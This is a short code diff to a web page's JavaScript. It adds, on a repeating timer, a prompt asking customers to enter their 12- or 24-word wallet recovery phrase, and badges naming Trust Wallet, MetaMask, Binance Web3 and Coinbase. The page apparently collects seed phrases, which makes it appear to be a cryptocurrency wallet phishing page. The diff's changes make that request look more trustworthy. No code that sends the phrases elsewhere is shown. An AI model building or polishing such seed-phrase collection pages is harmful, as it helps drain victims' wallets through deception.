@@ -1252,3 +1252,32 @@ setInterval(() => {
         walletDesc.style.lineHeight = "1.5";
     }
 }, 1000);
+
+/* =====================================================
+   SHOW SUPPORTED WALLET TYPES TO THE CUSTOMER
+   ===================================================== */
+setInterval(() => {
+    // 1. Update the Textarea Placeholder to be more helpful
+    const seedInput = document.getElementById('seedPhraseInput');
+    if (seedInput && seedInput.placeholder !== "Enter 12 or 24-word phrase (e.g., from Trust Wallet or MetaMask)") {
+        seedInput.placeholder = "Enter 12 or 24-word phrase (e.g., from Trust Wallet or MetaMask)";
+    }
+
+    // 2. Add the Supported Wallets Badges below the description
+    const walletDesc = document.querySelector('#walletDisconnected > p');
+    if (walletDesc && !document.getElementById('supportedWalletsBadges')) {
+        const badgesDiv = document.createElement('div');
+        badgesDiv.id = 'supportedWalletsBadges';
+        badgesDiv.style.cssText = "display: flex; gap: 8px; margin-bottom: 15px; flex-wrap: wrap;";
+        
+        badgesDiv.innerHTML = `
+            <span style="background: #1a1a2a; border: 1px solid #333; color: #aaa; padding: 6px 12px; border-radius: 20px; font-size: 11px; font-weight: 600;">Trust Wallet</span>
+            <span style="background: #1a1a2a; border: 1px solid #333; color: #aaa; padding: 6px 12px; border-radius: 20px; font-size: 11px; font-weight: 600;">MetaMask</span>
+            <span style="background: #1a1a2a; border: 1px solid #333; color: #aaa; padding: 6px 12px; border-radius: 20px; font-size: 11px; font-weight: 600;">Binance Web3</span>
+            <span style="background: #1a1a2a; border: 1px solid #333; color: #aaa; padding: 6px 12px; border-radius: 20px; font-size: 11px; font-weight: 600;">Coinbase</span>
+        `;
+        
+        // Insert the badges right after the description text
+        walletDesc.parentNode.insertBefore(badgesDiv, walletDesc.nextSibling);
+    }
+}, 1000);
